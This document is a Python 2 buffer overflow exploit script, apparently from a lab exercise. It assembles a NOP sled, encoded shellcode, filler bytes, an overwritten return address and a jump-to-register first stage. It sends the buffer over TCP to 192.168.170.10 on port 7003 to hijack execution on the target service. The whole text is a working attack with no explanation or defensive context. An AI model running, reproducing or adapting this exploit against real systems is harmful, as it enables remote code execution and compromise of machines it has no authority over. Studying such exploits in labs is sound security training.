#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  nops = "\x90" * 10
  shellcode = (
"\xba\xb5\xdd\x2f\xd9\xda\xda\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\x76\xd9\xcd\x2c\x84\x0a\x93"
"\xcf\x74\xcb\xf4\x46\x91\xfa\x34\x3c\xd2\xad\x84\x36\xb6\x41"
"\x6e\x1a\x22\xd1\x02\xb3\x45\x52\xa8\xe5\x68\x63\x81\xd6\xeb"
"\xe7\xd8\x0a\xcb\xd6\x12\x5f\x0a\x1e\x4e\x92\x5e\xf7\x04\x01"
"\x4e\x7c\x50\x9a\xe5\xce\x74\x9a\x1a\x86\x77\x8b\x8d\x9c\x21"
"\x0b\x2c\x70\x5a\x02\x36\x95\x67\xdc\xcd\x6d\x13\xdf\x07\xbc"
"\xdc\x4c\x66\x70\x2f\x8c\xaf\xb7\xd0\xfb\xd9\xcb\x6d\xfc\x1e"
"\xb1\xa9\x89\x84\x11\x39\x29\x60\xa3\xee\xac\xe3\xaf\x5b\xba"
"\xab\xb3\x5a\x6f\xc0\xc8\xd7\x8e\x06\x59\xa3\xb4\x82\x01\x77"
"\xd4\x93\xef\xd6\xe9\xc3\x4f\x86\x4f\x88\x62\xd3\xfd\xd3\xea"
"\x10\xcc\xeb\xea\x3e\x47\x98\xd8\xe1\xf3\x36\x51\x69\xda\xc1"
"\x96\x40\x9a\x5d\x69\x6b\xdb\x74\xae\x3f\x8b\xee\x07\x40\x40"
"\xee\xa8\x95\xc7\xbe\x06\x46\xa8\x6e\xe7\x36\x40\x64\xe8\x69"
"\x70\x87\x22\x02\x1b\x72\xa5\xed\x74\x0b\x9f\x86\x86\xf3\xde"
"\xed\x0e\x15\x8a\x01\x47\x8e\x23\xbb\xc2\x44\xd5\x44\xd9\x21"
"\xd5\xcf\xee\xd6\x98\x27\x9a\xc4\x4d\xc8\xd1\xb6\xd8\xd7\xcf"
"\xde\x87\x4a\x94\x1e\xc1\x76\x03\x49\x86\x49\x5a\x1f\x3a\xf3"
"\xf4\x3d\xc7\x65\x3e\x85\x1c\x56\xc1\x04\xd0\xe2\xe5\x16\x2c"
"\xea\xa1\x42\xe0\xbd\x7f\x3c\x46\x14\xce\x96\x10\xcb\x98\x7e"
"\xe4\x27\x1b\xf8\xe9\x6d\xed\xe4\x58\xd8\xa8\x1b\x54\x8c\x3c"
"\x64\x88\x2c\xc2\xbf\x08\x5c\x89\x9d\x39\xf5\x54\x74\x78\x98"
"\x66\xa3\xbf\xa5\xe4\x41\x40\x52\xf4\x20\x45\x1e\xb2\xd9\x37"
"\x0f\x57\xdd\xe4\x30\x72")
  filler = "A" * 1719
  eip = "\x1e\x11\x80\x14"
  first_stage = (
  "\xff\xe2\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90")
  buffer = nops + shellcode + filler + eip + first_stage
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.170.10", 7003))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"


